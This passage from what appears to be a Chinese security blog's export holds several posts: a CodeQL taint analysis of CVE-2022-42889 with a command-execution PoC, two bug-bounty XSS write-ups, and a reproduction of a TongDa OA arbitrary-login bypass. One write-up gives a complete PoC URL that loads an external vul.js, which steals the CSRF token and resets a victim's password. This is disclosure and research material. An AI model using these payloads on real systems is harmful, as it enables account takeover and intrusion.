    <content><![CDATA[<p>Apache Commons Text 是专门用来处理文本的一个库，据文档介绍其支持<a href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html">变量插值</a>。在1.5 - 1.9版本默认支持”script”类型的插值，于是可以造成任意代码执行，也就是CVE-2022-42889。</p>
<span id="more"></span>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>该工具库使用示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> interpolator.replace(</span><br><span class="line">        <span class="string">&quot;Base64 Decoder:$&#123;base64Decoder:SGVsbG9Xb3JsZCE=&#125;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;Date:                  $&#123;date:yyyy-MM-dd&#125;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;Environment Variable:  $&#123;env:USER&#125;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;Script:                $&#123;script:javascript:3 + 4&#125;\n&quot;</span>);</span><br><span class="line">System.out.println(text);</span><br></pre></td></tr></table></figure>

<p>执行结果为：</p>
<blockquote>
<p>Base64 Decoder:HelloWorld!<br>Date:                  2022-12-17<br>Environment Variable:  leixiao<br>Script:                7</p>
</blockquote>
<p>很容易发现安全问题，所以漏洞原理其实也很简单。</p>
<p>命令执行POC为：</p>
<blockquote>
<p>${script:js:new java.lang.ProcessBuilder(&quot;open&quot;, &quot;-a&quot;, &quot;calculator&quot;).start()}</p>
</blockquote>
<h2 id="CodeQL分析"><a href="#CodeQL分析" class="headerlink" title="CodeQL分析"></a>CodeQL分析</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul>
<li>CodeQL 2.11.6</li>
<li>Commons Text 1.9</li>
</ul>
<h3 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h3><p>调试跟踪，最后的触发点在</p>
<p>org.apache.commons.text.lookup.ScriptStringLookup#lookup</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Objects.toString(scriptEngine.eval(script), (String)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>可以写出如下Sink点</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ScriptEngineEval extends DataFlow::Node &#123;</span><br><span class="line">  ScriptEngineEval() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">      ma.getCallee().hasName(&quot;eval&quot;) <span class="keyword">and</span></span><br><span class="line">      ma.getCallee().getDeclaringType().getASupertype<span class="operator">*</span>().hasQualifiedName(&quot;javax.script&quot;, &quot;ScriptEngine&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asExpr() <span class="operator">=</span> ma.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>可以将该库所有公有类的字符串类型公有方法参数作为Source点</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class PublicMethodParameter extends DataFlow::Node &#123;</span><br><span class="line">  PublicMethodParameter() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m, <span class="keyword">Parameter</span> p <span class="operator">|</span></span><br><span class="line">      m.getDeclaringType().isPublic() <span class="keyword">and</span></span><br><span class="line">      m.isPublic() <span class="keyword">and</span></span><br><span class="line">      p <span class="operator">=</span> m.getAParameter() <span class="keyword">and</span></span><br><span class="line">      p.getType().hasName(&quot;String&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asParameter() <span class="operator">=</span> p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="额外的污点步骤"><a href="#额外的污点步骤" class="headerlink" title="额外的污点步骤"></a>额外的污点步骤</h3><p>发现直接使用上面的Source和Sink会没有查询结果，说明从Source到Sink的路径上缺少了一步，可以使用<a href="https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/">PartialPathGraph</a>来Debug</p>
<p>先将Source的范围缩小，否则查询会耗非常长时间，然后逐步将Source定义替换为沿路径出现的合适的Node</p>
<p>最后我的Source定义为函数<code>org.apache.commons.text.StringSubstitutor#resolveVariable</code>的参数，并且发现了污点传播中断的地方，完整查询如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line">class ResolveVariable extends DataFlow::Node &#123;</span><br><span class="line">  ResolveVariable() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> resolveVariable <span class="operator">|</span></span><br><span class="line">      resolveVariable</span><br><span class="line">          .getDeclaringType()</span><br><span class="line">          .hasQualifiedName(&quot;org.apache.commons.text&quot;, &quot;StringSubstitutor&quot;) <span class="keyword">and</span></span><br><span class="line">      resolveVariable.hasName(&quot;resolveVariable&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asParameter() <span class="operator">=</span> resolveVariable.getParameter(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  TaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;TaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof ResolveVariable &#125;</span><br><span class="line"></span><br><span class="line">  override <span class="type">int</span> explorationLimit() &#123; <span class="keyword">result</span> <span class="operator">=</span> <span class="number">10</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasPartialFlow(source, sink, _)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;-&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/image-20221217154807090.png" alt="image-20221217154807090"></p>
<p>污点传播止于<code>resolver.lookup(variableName)</code>的参数<code>variableName</code>，这里的<code>resolver</code>是<code>StringLookup</code>接口。我期望的是污点继续流向<code>StringLookup</code>的具体实现类中，其实CodeQL一般是支持Java这种多态特性的，但是就该项目来看，<del>这一部分的写法比较特殊，导致CodeQL不支持</del>。（后面搜到了一条相关的issue：<a href="https://github.com/github/codeql/issues/11385">https://github.com/github/codeql/issues/11385</a> ，然后我又去做了对照实验，确实当接口名为<code>org.apache.commons.text.lookup.StringLookup</code>就会有这个bug）</p>
<p>最后解决办法比较粗暴，如果调用抽象方法，那么直接将污点传播到对应的所有具体方法上</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class TaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">  override predicate step(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma, <span class="keyword">Method</span> m, RefType baseClass <span class="operator">|</span></span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>pred为调用抽象方法时传入的参数,succ为传入到具体方法的参数</span><br><span class="line">      (</span><br><span class="line">        ma.getCallee().isAbstract() <span class="keyword">and</span></span><br><span class="line">        pred.asExpr() <span class="operator">=</span> ma.getAnArgument() <span class="keyword">and</span></span><br><span class="line">        <span class="keyword">not</span> m.isAbstract() <span class="keyword">and</span></span><br><span class="line">        succ.asParameter() <span class="operator">=</span> m.getAParameter()</span><br><span class="line">      ) <span class="keyword">and</span></span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>调用的抽象方法需要和具体方法名字一样</span><br><span class="line">      ma.getCallee().getName() <span class="operator">=</span> m.getName() <span class="keyword">and</span></span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>调用的抽象方法所属的类和具体方法所属的类应该继承自同一抽象类</span><br><span class="line">      (</span><br><span class="line">        baseClass.isAbstract() <span class="keyword">and</span></span><br><span class="line">        ma.getCallee().getDeclaringType().hasSupertype<span class="operator">*</span>(baseClass) <span class="keyword">and</span></span><br><span class="line">        m.getDeclaringType().hasSupertype<span class="operator">*</span>(baseClass)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="完整查询"><a href="#完整查询" class="headerlink" title="完整查询"></a>完整查询</h3><p>最后完整查询如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class PublicMethodParameter extends DataFlow::Node &#123;</span><br><span class="line">  PublicMethodParameter() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m, <span class="keyword">Parameter</span> p <span class="operator">|</span></span><br><span class="line">      m.getDeclaringType().isPublic() <span class="keyword">and</span></span><br><span class="line">      m.isPublic() <span class="keyword">and</span></span><br><span class="line">      p <span class="operator">=</span> m.getAParameter() <span class="keyword">and</span></span><br><span class="line">      p.getType().hasName(&quot;String&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asParameter() <span class="operator">=</span> p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ScriptEngineEval extends DataFlow::Node &#123;</span><br><span class="line">  ScriptEngineEval() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">      ma.getCallee().hasName(&quot;eval&quot;) <span class="keyword">and</span></span><br><span class="line">      ma.getCallee().getDeclaringType().getASupertype<span class="operator">*</span>().hasQualifiedName(&quot;javax.script&quot;, &quot;ScriptEngine&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asExpr() <span class="operator">=</span> ma.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">  override predicate step(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma, <span class="keyword">Method</span> m, RefType baseClass <span class="operator">|</span></span><br><span class="line">      (</span><br><span class="line">        ma.getCallee().isAbstract() <span class="keyword">and</span></span><br><span class="line">        pred.asExpr() <span class="operator">=</span> ma.getAnArgument() <span class="keyword">and</span></span><br><span class="line">        <span class="keyword">not</span> m.isAbstract() <span class="keyword">and</span></span><br><span class="line">        succ.asParameter() <span class="operator">=</span> m.getAParameter()</span><br><span class="line">      ) <span class="keyword">and</span></span><br><span class="line">      ma.getCallee().getName() <span class="operator">=</span> m.getName() <span class="keyword">and</span></span><br><span class="line">      (</span><br><span class="line">        baseClass.isAbstract() <span class="keyword">and</span></span><br><span class="line">        ma.getCallee().getDeclaringType().hasSupertype<span class="operator">*</span>(baseClass) <span class="keyword">and</span></span><br><span class="line">        m.getDeclaringType().hasSupertype<span class="operator">*</span>(baseClass)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  TaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;TaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof PublicMethodParameter &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof ScriptEngineEval &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink,</span><br><span class="line">  &quot;Source: &quot; <span class="operator">+</span> source.getNode().asParameter().getCallable().getDeclaringType() <span class="operator">+</span> &quot;.&quot; <span class="operator">+</span></span><br><span class="line">    source.getNode().asParameter().getCallable()</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次XSS挖掘过程</title>
    <url>/2020/05/10/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>最近在挖SRC，记录一下一些有趣的漏洞</p>
<span id="more"></span>

<p>这个站整体安全性挺高，测了许久也不见有什么问题，就把精力放在了可能遗漏的接口上，遂在一个接口页面引入的js文件里面又找出一个接口地址（目录扫描没有发现），简单浏览了下该页面，发现是个功能已经被废弃的API，既然没有功能，那只能找找诸如XSS一类的漏洞</p>
<p>然后发现url中的地址被拼接进了HTML页面中</p>
<p>首先是被拼入到了div的id属性，然后就是一个标签名称的后半部分，显然是个自定义的标签名</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510230041071.png" alt="image-20200510230041071"></p>
<p>还作为了一个js文件名的一部分</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510230311329.png" alt="image-20200510230311329"></p>
<p>特殊符号在所有输出点没有例外都做了转义，当然XSS这样防御完全没有问题</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510230521285.png" alt="image-20200510230521285"></p>
<p>但是有一部分输出在HTML标签名处</p>
<blockquote>
<p><code>&lt;exxx-xxxs-[输出点]&gt;</code></p>
</blockquote>
<p>那么突破口就来了，可以用标签的属性来触发事件，如这里的onmouseover</p>
<blockquote>
<p><code>&lt;a onmouseover=&#39;alert(document.cookie)&#39;&gt;xxs link&lt;/a&gt;</code></p>
</blockquote>
<p>但是<code>exxx-xxxs-[输出点]</code> 显然不是一个规范的HTML标签，那也能触发onmouseover吗？答案是肯定的</p>
<p>尝试构造 <code>[空格]onmouseover=&#39;alert(document.cookie)&#39;</code></p>
<p>没有成功，可以看见谷歌浏览器拦截了此payload</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510231640593.png" alt="image-20200510231640593"></p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510231739324.png" alt="image-20200510231739324"></p>
<p>不仅拦截，而且可见单引号也未正常工作，如何绕过这里的XSS Auditor以及单引号？其实只要删去这一对单引号即可</p>
<p> <code>[空格]onmouseover=alert(document.cookie)</code></p>
<p>这样payload也是可以正常工作的</p>
<p>但是页面显示空白，弹窗也未出现</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510232104562.png" alt="image-20200510232104562"></p>
<p>这是因为之前提到的输出点不仅在标签名内，也在一个外部js文件名中，这个js引入失败，页面即加载失败</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510232312189.png" alt="image-20200510232312189"></p>
<p>马上想到的绕过方法是利用..&#x2F;向上级目录跳，然后再指向正常的js文件</p>
<p>原文件名是</p>
<p><code>/exxx-xxxs-your-name.min.js</code></p>
<p>所以构造</p>
<p><code>%20onmouseover=alert(document.cookie)%20%2F..%2Fexxx-xxxs-your-name</code></p>
<p>其实构造的时候就发现问题了，%2F即&#x2F;显然直接被当做路径分隔符了</p>
<p>那双编码？这里也不行回显出来是%25</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510233022389.png" alt="image-20200510233022389"></p>
<p>其实正斜线不行，那用反斜线同样可以的</p>
<p><code>%20onmouseover=alert(document.cookie)%20%5c..%5cexxx-xxxs-your-name</code></p>
<p>如此，js文件路径问题也解决了</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510233403304.png" alt="image-20200510233403304"></p>
<p>但网页依旧空白，并且控制台没有报错</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510233515448.png" alt="image-20200510233515448"></p>
<p>这让我回想起之前的自定义标签，应该是标签名变了，这里页面无处渲染</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510233716259.png" alt="image-20200510233716259"></p>
<p>那么接着改payload，将标签名同时复原</p>
<p><code>your-name%20onmouseover=alert(document.cookie)%20%5c..%5cexxx-xxxs-your-name</code></p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510233900628.png" alt="image-20200510233900628"></p>
<p>拿起鼠标在页面一晃，good job！</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200510234044653.png" alt="image-20200510234044653"></p>
]]></content>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次反射型XSS+设计缺陷修改任意用户密码挖掘过程</title>
    <url>/2020/05/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>最近在挖SRC，记录一下一些有趣的漏洞</p>
<span id="more"></span>

<p>这个站同样没发现什么大的问题，这也是最近几天第三次挖掘该站了，在网站的各个地方输出都做了转义，一般来说并不会出现XSS，不过今天测试时开了两个浏览器窗口，当我在其中一个窗口重置密码时，发现另一个窗口出现了弹窗提示</p>
<p>看到url和提示框中一致的id时觉得这里大有文章可做</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512173359187.png" alt="image-20200512173359187"></p>
<p>测试下特殊符号，发现这里输出同样也会转义</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512173647987.png" alt="image-20200512173647987"></p>
<p>一般到此可能就会放弃了，不过幸好我随手多试了一下，发现一个完整的标签竟然没有转义</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512173909686.png" alt="image-20200512173909686"></p>
<p>然后很快的输入弹窗payload</p>
<p><code>&lt;img src=x onerror=&#39;alert(1)&#39;&gt;</code></p>
<p>发现直接被过滤了</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512174132856.png" alt="image-20200512174132856"></p>
<p>继续盲测，也很简单就饶了过去，用script标签</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512174532130.png" alt="image-20200512174532130"></p>
<p>另外在该网站有一处设计缺陷，便是手机注册的用户默认都没有密码，而且在个人中心可以直接设置新密码，当然有csrf_token保护，所以不能csrf攻击，不过结合XSS的话便可以直接修改他人密码了</p>
<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/image-20200512175054780.png" alt="image-20200512175054780"></p>
<p>在用xss构造修改密码的表单时，用script src指向外部js文件更加方便，但是发现依旧和之前过滤img src&#x3D;x的情况一样，前端显示undefined，后面发现是是自己疏忽了，等号url编码后即可</p>
<p><code>&lt;script src%3d&quot;xxx&quot;&gt;&lt;/script&gt;</code></p>
<p>最后poc，打开即可修改密码为Aa123456</p>
<p><code>https://xxxx/login?userId=%3Cscript%20src%3d%22https://l3yx.github.io/resource/vul.js?123123%22%3E%3C/script%3E</code></p>
<p>vul.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getcookie</span>(<span class="params">objname</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> arrstr = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;; &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; arrstr.<span class="property">length</span>;i ++)&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arrstr[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(temp[<span class="number">0</span>] == objname) <span class="keyword">return</span> <span class="built_in">unescape</span>(temp[<span class="number">1</span>]);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> csrf_token=<span class="title function_">getcookie</span>(<span class="string">&quot;csrf_token&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!csrf_token)&#123;</span><br><span class="line">    csrf_token=<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">    xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;/api/user/set_password&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;csrf_token=&quot;</span>+csrf_token+<span class="string">&quot;&amp;current=&amp;password=Aa123456&amp;confirm=Aa123456&quot;</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 任意用户登录漏洞</title>
    <url>/2020/04/27/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>通达 OA 存在认证绕过漏洞，由外部可控的参数可登录任意用户</p>
<span id="more"></span>

<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>通达 OA 是一套国内常用的办公系统，2020年4月17日，通达OA官方发布了最新的<a href="https://www.tongda2000.com/download/sp2019.php">通达OA 11.5.200417</a>版本，该版本修复了若干安全问题。</p>
<p>对于部分版本，存在一个认证绕过漏洞，利用该漏洞可以实现任意用户登录，包括管理员</p>
<p>影响范围</p>
<ul>
<li>通达 OA 2017 版</li>
<li>通达 OA V11.X &lt; V11.5</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe">通达 OA V11.4</a></p>
<p>访问&#x2F;general&#x2F;login_code.php获取code_uid</p>
<p><img src="/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/image-20200427163951605.png" alt="image-20200427163951605"></p>
<p>POST传递CODEUID和被伪造用户的UID到&#x2F;logincheck_code.php，返回的SESSID即其身份</p>
<p><img src="/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/image-20200427164027214.png" alt="image-20200427164027214"></p>
<p>携带SESSID访问</p>
<p><img src="/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/image-20200427164111745.png" alt="image-20200427164111745"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>源码在程序安装目录的webroot目录下，用<a href="https://paper.seebug.org/203/">工具</a>解密</p>
<p>&#x2F;logincheck_code.php</p>
<p><img src="/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/image-20200427172040437.png" alt="image-20200427172040437"></p>
<p>UID参数可控，在通过15行对login_codeuid的判断后，该值会被直接代入SQL语句进行查询，最后会返回对应UID的用户的信息，通达OA默认的第一个用户是管理员admin账户，所以可以设置UID为1，即可获取到admin管理员的信息，要通过15行的判断需要获取code_uid</p>
<p>&#x2F;general&#x2F;login_code.php</p>
<p><img src="/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/image-20200427172441588.png" alt="image-20200427172441588"></p>
<p>当login_codeuid为空时会生成一个存入redis缓存并在最后输出</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/203/">实用工具：免费Zend 5.2 5.3 5.4解密工具</a></p>
<p><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">TongDaOA-Fake-User</a></p>
<p><a href="https://mp.weixin.qq.com/s/VlZUU6bnC8XEsLdIDUhUIQ">漏洞安全公告|通达OA 任意用户登录漏洞</a></p>
]]></content>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约漏洞靶场——Ethernaut</title>
    <url>/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/</url>
